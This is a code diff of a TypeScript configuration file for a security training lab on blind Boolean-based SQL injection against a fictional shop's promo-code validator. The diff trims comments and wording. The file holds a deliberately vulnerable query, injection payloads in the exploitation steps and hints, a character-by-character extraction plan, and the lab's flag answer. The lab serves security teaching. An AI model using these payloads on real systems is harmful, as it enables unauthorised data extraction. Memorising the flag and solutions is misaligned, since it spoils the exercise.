@@ -1,7 +1,6 @@
 import type { LabMetadata } from '../../../types/lab-metadata.type';
 
 export const lab3Metadata: LabMetadata = {
-  // ─── Identity ──────────────────────────────────────────────────────
   slug: 'sqli-blind-boolean',
   title: 'SQL Injection: Blind Boolean-Based Extraction',
   ar_title: 'حقن SQL: الاستخراج الأعمى (Boolean-Based)',
@@ -24,58 +23,51 @@ export const lab3Metadata: LabMetadata = {
   executionMode: 'SHARED_BACKEND',
   isPublished: true,
 
-  // ─── Pedagogy ──────────────────────────────────────────────────────
-  goal: 'Extract the full admin secret stored in the database by exploiting Boolean-based Blind SQL Injection in the promo code validator.',
+  goal: 'Extract the full admin secret using Boolean-based Blind SQLi in the promo code validator.',
   scenario: {
     context:
-      "ShopX's checkout page validates promo codes against a database. The response is always binary: " +
-      "'✅ Coupon applied!' or '❌ Invalid coupon.' — no data, no errors, just a boolean. " +
-      "An admin note containing a secret flag was stored as a private content entry with title='admin_secret'. " +
-      'Your mission: craft boolean conditions inside the coupon field to extract this flag character by character.',
+      "ShopX's checkout page validates promo codes. The response is always binary — no data, no errors. " +
+      "An admin note containing the flag was stored as a private content entry with title='admin_secret'. " +
+      'Extract it character by character using boolean conditions.',
     vulnerableCode:
       'SELECT id FROM "LabGenericContent"\n' +
       "WHERE userId='...' AND labId='..'\n" +
       "AND title='valid_coupon' AND body='COUPON_INPUT'",
     exploitation:
-      "1) Confirm injection: ' OR '1'='1'-- → should return 'Coupon applied!'\n" +
-      "2) Extract char at position 1: ' OR (SELECT SUBSTRING(body,1,1) FROM \"LabGenericContent\" WHERE title='admin_secret' LIMIT 1)='F'--\n" +
-      '3) Iterate position + charset until full flag is assembled.\n' +
-      '4) Submit the extracted flag via POST /practice-labs/:labId/submit',
+      "1) Confirm: ' OR '1'='1'-- → 'Coupon applied!'\n" +
+      "2) Extract char: ' OR (SELECT SUBSTRING(body,1,1) FROM \"LabGenericContent\" WHERE title='admin_secret' LIMIT 1)='F'--\n" +
+      '3) Iterate position + charset → assemble full flag → submit.',
   },
   hints: [
     {
       order: 1,
       xpCost: 10,
       content:
-        "First confirm the injection point works: enter ' OR '1'='1'-- as the coupon. If you see 'Coupon applied!' — the field is injectable.",
+        "Confirm injection: ' OR '1'='1'-- → should return 'Coupon applied!'",
     },
     {
       order: 2,
       xpCost: 20,
       content:
-        "A secret note exists with title='admin_secret'. Use it in a subquery: ' OR (SELECT COUNT(*) FROM \"LabGenericContent\" WHERE title='admin_secret') > 0 --",
+        "A secret note exists with title='admin_secret'. Confirm: ' OR (SELECT COUNT(*) FROM \"LabGenericContent\" WHERE title='admin_secret') > 0 --",
     },
     {
       order: 3,
       xpCost: 40,
       content:
-        "Extract one character at a time: ' OR (SELECT SUBSTRING(body,1,1) FROM \"LabGenericContent\" WHERE title='admin_secret' LIMIT 1) = 'F'--\n" +
-        'True response = that character is correct.',
+        "Extract one char: ' OR (SELECT SUBSTRING(body,1,1) FROM \"LabGenericContent\" WHERE title='admin_secret' LIMIT 1) = 'F'--",
     },
     {
       order: 4,
       xpCost: 60,
       content:
-        'Write a script that loops position 1 to 35, and for each position tries chars: A-Z, 0-9, {, }, _. ' +
-        'Assemble matched chars into the full flag and submit it via the normal submit endpoint.',
+        'Write a script: loop position 1→35, try charset A-Z/0-9/{/}/_. Assemble the full flag and submit.',
     },
   ],
 
-  // ─── Seed ──────────────────────────────────────────────────────────
   flagAnswer: 'FLAG{BLIND_SQLI_EXFIL_SUCCESS}',
   initialState: {
     contents: [
-      // Valid coupons — these are what the UI is "supposed" to check
       {
         title: 'valid_coupon',
         body: 'SAVE20SUMMER',
@@ -94,7 +86,6 @@ export const lab3Metadata: LabMetadata = {
         isPublic: true,
         author: 'marketing',
       },
-      // Hidden admin note — never shown in normal app flow
       {
         title: 'admin_secret',
         body: 'FLAG{BLIND_SQLI_EXFIL_SUCCESS}',
